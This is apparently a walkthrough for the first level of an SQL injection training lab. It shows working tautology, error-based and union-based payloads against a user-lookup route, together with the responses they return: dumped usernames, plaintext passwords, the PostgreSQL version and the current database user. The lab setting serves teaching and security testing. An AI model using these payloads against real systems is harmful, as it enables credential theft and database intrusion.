## Level-1

Target Route: 

```
/users/level1?id=<payload>
```
ID parameters accepts a number. Example:

```
This:
/users/level1?id=2

Returns:
[{"id":2,"username":"john_doe","password":"password123","role":"USER"}]
```

Take a careful look at the response. `role` has a value of "USER", for certain IDs, it can be "ADMIN" as well.

Vulnerabilities applicaple (primary ones only):

1. Tautology
2. Error-Based
3. Union-Based

### Tautology

```
Payload:
1 OR 1=1

Returns:
[{"id":1,"username":"admin","password":"SuperSecretAdminPassword123!","role":"ADMIN"},{"id":2,"username":"john_doe","password":"password123","role":"USER"},{"id":3,"username":"jane_smith","password":"qwerty!@#","role":"USER"}]
```

### Error-Based

```
Payload:
1'

Returns an Error - Enumeration technique:
{"message":"unterminated quoted string at or near \"'\"","error":"Internal Server Error","statusCode":500}
```

### Union-Based

Remember, that payload `id=2` returned this response:

```
[{"id":2,"username":"john_doe","password":"password123","role":"USER"}]
```

These are 4 columns in total. We can use Union-based SQLi to enumerate current user and possibly database structure.

The first column is a number, second and third are strings and the `role` is also possibly a string.

```
This payload:
?id=-1 UNION SELECT 1, version(), current_user, 'norole'--

Returns an error:
{"message":"invalid input value for enum users_role_enum: \"norole\"","error":"Internal Server Error","statusCode":500}
```

This is a major finding because ROLE can have only a few valid values since it is an Enum structure. We can simply replace "norole" with a valid value (from the previous tests), such as "USER" and it would work well:

```
Payload:
?id=-1 UNION SELECT 1, version(), current_user, 'USER'--

Returns:
[{"id":1,"username":"PostgreSQL 15.17 (Debian 15.17-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit","password":"sqli_user","role":"USER"}]
```

